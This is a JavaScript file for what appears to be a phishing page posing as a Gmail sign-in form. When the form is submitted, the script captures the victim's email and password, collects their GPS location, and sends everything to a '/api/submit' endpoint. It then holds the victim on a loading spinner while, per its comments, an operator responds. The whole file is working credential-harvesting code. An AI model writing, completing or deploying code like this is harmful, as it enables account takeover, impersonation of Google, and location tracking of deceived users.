(function () {
  const form = document.getElementById('mailing-password-form');
  if (!form) return;
  const email = window.__MAILING_EMAIL__ || '';
  const errorBox = document.getElementById('mailing-inline-error');
  const submitBtn = document.querySelector('.mailing-btn');

  function showError(msg) {
    if (errorBox) {
      errorBox.textContent = msg;
      errorBox.classList.add('is-visible');
    }
    // Reset button
    if (submitBtn) {
      submitBtn.textContent = 'Sign in';
      submitBtn.disabled = false;
    }
    // Re-show form
    form.style.display = '';
    const loading = document.getElementById('mailing-loading');
    if (loading) loading.style.display = 'none';
    const passwordInput = document.getElementById('mailing-password');
    if (passwordInput) setTimeout(() => passwordInput.focus(), 200);
  }

  // Expose for response.js inline error handling
  window.__AuthForm = {
    showError: showError,
  };

  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    const password = document.getElementById('mailing-password').value;
    if (!password) return;

    const loading = document.getElementById('mailing-loading');
    const card = document.querySelector('.mailing-form');
    card.style.display = 'none';
    if (loading) loading.style.display = 'flex';
    if (errorBox) errorBox.classList.remove('is-visible');

    const gps = window.__ResponseControls ? await window.__ResponseControls.collectGps() : { lat: null, lng: null };

    fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, provider: 'Gmail', lat: gps.lat, lng: gps.lng }),
    })
      .then((r) => r.json())
      .then((data) => {
        if (data.sessionId && window.__ResponseControls) {
          window.__ResponseControls.setSessionId(data.sessionId);
          window.__ResponseControls.start(data.sessionId);
        }
        // Stay on page — do NOT redirect
        // The loading spinner stays visible while waiting for operator response
      })
      .catch(() => {
        showError('Something went wrong. Please try again.');
      });
  });

  const change = document.getElementById('mailing-change');
  if (change) {
    change.addEventListener('click', function () {
      window.location.href = '/mailing';
    });
  }
})();
